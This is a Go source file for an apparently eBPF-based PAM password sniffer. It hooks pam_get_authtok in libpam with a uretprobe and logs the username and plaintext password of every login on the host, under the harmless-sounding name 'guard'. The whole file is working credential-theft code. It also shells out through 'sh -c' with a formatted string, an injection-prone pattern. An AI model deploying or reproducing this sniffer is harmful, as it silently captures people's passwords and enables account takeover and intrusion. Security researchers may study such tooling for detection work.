package main

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 guard guard.c
import (
	"bytes"
	"encoding/binary"
	"log"
	"os"
	"fmt"
	"os/signal"
	"os/exec"
	"strings"
	"bufio"
	"syscall"
	"errors"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

const (
	defaultBinPath = "libpam.so.0"
	defaultSymbol  = "pam_get_authtok"
)

type eventT struct {
	Pid      int32
	Comm     [16]byte
	Username [80]byte
	Password [80]byte
}

func byteArrayToString(b []byte) string {
	n := -1
	for i, v := range b {
		if v == 0 {
			n = i
			break
		}
	}
	if n == -1 {
		n = len(b)
	}
	return string(b[:n])
}

func findLibraryPath(libname string) (string, error) {
	cmd := exec.Command("sh", "-c", fmt.Sprintf("ldconfig -p | grep %s", libname))

	// Run the command and get the output
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("failed to run ldconfig: %w", err)
	}

	// Read the first line of output which should have the library path
	scanner := bufio.NewScanner(&out)
	if scanner.Scan() {
		line := scanner.Text()
		// Extract the path from the ldconfig output
		if start := strings.LastIndex(line, ">"); start != -1 {
			path := strings.TrimSpace(line[start+1:])
			return path, nil
		}
	}

	return "", fmt.Errorf("library not found")
}

func main() {
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// Allow the current process to lock memory for eBPF resources.
	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatal(err)
	}

	// Load pre-compiled programs and maps into the kernel.
	objs := guardObjects{}
	if err := loadGuardObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer objs.Close()

	pamPath, err := findLibraryPath(defaultBinPath);
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("LibPAM path: %s\n", defaultBinPath);

	// Open an ELF binary and read its symbols.
	ex, err := link.OpenExecutable(pamPath)
	if err != nil {
		log.Fatalf("opening executable: %s", err)
	}

	// Set up uretprobes
	uretprobe_pam, err := ex.Uretprobe(defaultSymbol, objs.TracePamGetAuthtok, nil)
	if err != nil {
		log.Fatalf("creating uretprobe - %s: %s", defaultSymbol, err)
	}
	defer uretprobe_pam.Close()


	rd, err := ringbuf.NewReader(objs.Rb)
	if err != nil {
		log.Fatalf("opening ringbuf reader: %s", err)
	}
	defer rd.Close()

	// Close the reader when the process receives a signal, which will exit
	// the read loop.
	go func() {
		<-stopper

		if err := rd.Close(); err != nil {
			log.Fatalf("closing ringbuf reader: %s", err)
		}
	}()
	log.Println("Waiting for events..")

	var event eventT
	for {
		record, err := rd.Read()
		if err != nil {
			if errors.Is(err, ringbuf.ErrClosed) {
				log.Println("Received signal, exiting..")
				return
			}
			log.Printf("reading from reader: %s", err)
			continue
		}

		// Parse the ringbuf event entry into a eventT structure.
		if err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &event); err != nil {
			log.Printf("error parsing ringbuf event: %s", err)
			continue
		}
		log.Printf("pid: %d username: %s password: %s\n\n", event.Pid, byteArrayToString(event.Username[:]), byteArrayToString(event.Password[:]))
	}
}
